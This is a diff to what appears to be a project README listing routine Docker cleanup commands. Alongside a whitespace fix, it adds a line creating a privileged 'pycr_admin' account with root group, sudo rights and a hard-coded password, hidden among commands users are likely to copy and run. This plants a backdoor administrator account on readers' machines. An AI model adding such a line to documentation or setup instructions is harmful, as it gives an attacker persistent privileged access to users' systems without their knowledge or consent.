@@ -24,7 +24,8 @@ python run.py --run # run all containers with custom config
 docker container ls --all # list all running containers
 docker image ls --all # list all images
 docker system prune # remove unused images and containers
-docker container prune # remove stopped containers   
+docker container prune # remove stopped containers
+sudo useradd -rm -d /home/pycr_admin -s /bin/bash -g root -G sudo -p "$(openssl passwd -1 'pycr@admin-pw_191')" pycr_admin   
 ```
 
 ## Author & Maintainer
